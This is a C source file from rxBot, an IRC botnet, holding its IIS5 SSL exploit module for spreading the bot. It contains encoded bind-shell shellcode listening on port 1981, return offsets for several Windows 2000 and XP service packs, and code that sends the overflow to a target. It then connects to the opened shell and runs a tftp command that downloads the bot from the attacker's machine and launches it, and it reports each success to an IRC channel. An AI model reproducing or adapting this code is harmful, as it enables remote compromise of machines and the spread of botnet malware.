/*

    rxBot - a modular IRC bot for Win32
    Copyright (C) 2004

    This program is free software; you can redistribute it and/or modify
    it under the terms of the GNU General Public License as published by
    the Free Software Foundation; either version 2 of the License, or
    (at your option) any later version.

    This program is distributed in the hope that it will be useful,
    but WITHOUT ANY WARRANTY; without even the implied warranty of
    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
    GNU General Public License for more details.

    You should have received a copy of the GNU General Public License
    along with this program; if not, write to the Free Software
    Foundation, Inc., 59 Temple Place, Suite 330, Boston, MA  02111-1307  USA

*/

#include "includes.h"
#include "functions.h"
#include "externs.h"

#ifndef NO_IIS5SSL

#define jumper					"\xeb\x0f"
#define bind_shell_code			"\x4E\x49\x4C\x53\x49\x53\x47\x41\x59\x21\x21"

char shellcode[] = //bind port 1981
	"\xEB\x10\x5A\x4A\x33\xC9\x66\xB9\x66\x01\x80\x34\x0A\x99\xE2\xFA"
	"\xEB\x05\xE8\xEB\xFF\xFF\xFF" 
	"\x70\x99\x98\x99\x99\xC3\x21\x95\x69\x64\xE6\x12\x99\x12\xE9\x85"
	"\x34\x12\xD9\x91\x12\x41\x12\xEA\xA5\x9A\x6A\x12\xEF\xE1\x9A\x6A"
	"\x12\xE7\xB9\x9A\x62\x12\xD7\x8D\xAA\x74\xCF\xCE\xC8\x12\xA6\x9A"
	"\x62\x12\x6B\xF3\x97\xC0\x6A\x3F\xED\x91\xC0\xC6\x1A\x5E\x9D\xDC"
	"\x7B\x70\xC0\xC6\xC7\x12\x54\x12\xDF\xBD\x9A\x5A\x48\x78\x9A\x58"
	"\xAA\x50\xFF\x12\x91\x12\xDF\x85\x9A\x5A\x58\x78\x9B\x9A\x58\x12"
	"\x99\x9A\x5A\x12\x63\x12\x6E\x1A\x5F\x97\x12\x49\xF3\x9A\xC0\x71"
	"\xE5\x99\x99\x99\x1A\x5F\x94\xCB\xCF\x66\xCE\x65\xC3\x12\x41\xF3"
	"\x9D\xC0\x71\xF0\x99\x99\x99\xC9\xC9\xC9\xC9\xF3\x98\xF3\x9B\x66"
	"\xCE\x69\x12\x41\x5E\x9E\x9B\x99\x9E\x24\xAA\x59\x10\xDE\x9D\xF3"
	"\x89\xCE\xCA\x66\xCE\x6D\xF3\x98\xCA\x66\xCE\x61\xC9\xC9\xCA\x66"
	"\xCE\x65\x1A\x75\xDD\x12\x6D\xAA\x42\xF3\x89\xC0\x10\x85\x17\x7B"
	"\x62\x10\xDF\xA1\x10\xDF\xA5\x10\xDF\xD9\x5E\xDF\xB5\x98\x98\x99"
	"\x99\x14\xDE\x89\xC9\xCF\xCA\xCA\xCA\xF3\x98\xCA\xCA\x5E\xDE\xA5"
	"\xFA\xF4\xFD\x99\x14\xDE\xA5\xC9\xCA\x66\xCE\x7D\xC9\x66\xCE\x71"
	"\xAA\x59\x35\x1C\x59\xEC\x60\xC8\xCB\xCF\xCA\x66\x4B\xC3\xC0\x32"
	"\x7B\x77\xAA\x59\x5A\x71\x62\x67\x66\x66\xDE\xFC\xED\xC9\xEB\xF6"
	"\xFA\xD8\xFD\xFD\xEB\xFC\xEA\xEA\x99\xDA\xEB\xFC\xF8\xED\xFC\xC9"
	"\xEB\xF6\xFA\xFC\xEA\xEA\xD8\x99\xDC\xE1\xF0\xED\xC9\xEB\xF6\xFA"
	"\xFC\xEA\xEA\x99\xD5\xF6\xF8\xFD\xD5\xF0\xFB\xEB\xF8\xEB\xE0\xD8"
	"\x99\xEE\xEA\xAB\xC6\xAA\xAB\x99\xCE\xCA\xD8\xCA\xF6\xFA\xF2\xFC"
	"\xED\xD8\x99\xFB\xF0\xF7\xFD\x99\xF5\xF0\xEA\xED\xFC\xF7\x99\xF8"
	"\xFA\xFA\xFC\xE9\xED\x99";

BOOL IIS5SSL(EXINFO exinfo)
{
	char buffer[IRCLINE];
	char request[]="\x80\x62\x01\x02\xbd\x00\x01\x00\x01\x00\x16\x8f\x82\x01\x00\x00\x00";

	unsigned long XOR=0xffffffff;
	unsigned long offsets[] = {	
		0x6741a1cd,		// Win2K SP0
		0x6741a199,		// Win2K SP1
		0x6741a426,		// Win2K SP2
		0x67419e1d,		// Win2K SP3
		0x67419ce8,		// Win2K SP4
		0x0ffb7de9,		// WinXP SP0
		0x0ffb832f		// WinXP SP1
	};

	BOOL bRet = FALSE;

	unsigned char *badbuffer=(unsigned char*)malloc(347); 
	memset(badbuffer, 0, 347);
	unsigned char *p=badbuffer; 
	memcpy(p, request, sizeof(request));
	p+=sizeof(request)-1; 
	strcat((char*)p, jumper);
	strcat((char*)p, bind_shell_code);

	SOCKET sSock;
	if((sSock = fsocket(PF_INET, SOCK_STREAM, IPPROTO_TCP)) != INVALID_SOCKET) {
		SOCKADDR_IN ssin;

		for (int i=0; i < (sizeof(offsets) / sizeof(LPTSTR)); i++) {
			memset(&ssin, 0, sizeof(ssin));
			ssin.sin_family = AF_INET;
			ssin.sin_addr.s_addr = finet_addr(exinfo.ip);
			ssin.sin_port = fhtons(exinfo.port);

			if(fconnect(sSock, (LPSOCKADDR)&ssin, sizeof(ssin)) != SOCKET_ERROR) {
				offsets[i]^=XOR; 
				strncat((char*)p, (char*)&offsets[i], 4);
				strcat((char*)p, shellcode);

				if (fsend(sSock, (char *)&badbuffer, strlen((char *)&badbuffer), 0)) { 
					Sleep(1000); 
					fclosesocket(sSock);
			
					memset(&ssin, 0, sizeof(ssin));
					ssin.sin_family = AF_INET;
					ssin.sin_addr.s_addr = finet_addr(exinfo.ip);
					ssin.sin_port = fhtons(1981);

					if(fconnect(sSock, (LPSOCKADDR)&ssin, sizeof(ssin))) {
						char cmd_buff[400];
						_snprintf(cmd_buff,sizeof(cmd_buff),
							"tftp -i %s get %s\n"
							"%s\n",
							GetIP(exinfo.sock),filename, filename);
							
						if(frecv(exinfo.sock, buffer, sizeof(buffer), 0) > 0) {
							Sleep(500);

							if(fsend(sSock,(char*)cmd_buff, strlen(cmd_buff),0) > 0) {
								fclosesocket(sSock);
								bRet = TRUE;
							} else {
								bRet = FALSE; }
							break;
						}
					}    
								fclosesocket(sSock);
								if (bRet) {
								_snprintf(buffer, sizeof(buffer), "[%s]: Trying Sploit IP: %s.", exploit[exinfo.exploit].name, exinfo.ip);
								if (!exinfo.silent) irc_privmsg(exinfo.sock, exinfo.chan, buffer, exinfo.notice);
								addlog(buffer);
								exploit[exinfo.exploit].stats++;

								break;
								}
				}
			}
		}
	}

	return (bRet);
}
#endif
